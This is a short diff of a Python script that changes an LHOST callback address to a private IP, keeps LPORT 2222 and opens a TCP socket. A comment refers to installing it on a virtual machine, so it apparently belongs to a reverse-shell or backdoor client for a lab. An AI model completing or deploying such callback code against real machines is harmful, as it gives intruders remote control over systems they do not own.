@@ -9,7 +9,7 @@ import colorama
 colorama.init()
 
 #change before install on virtual machine
-LHOST = "127.0.0.1"
+LHOST = "192.168.163.1"
 LPORT = 2222
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
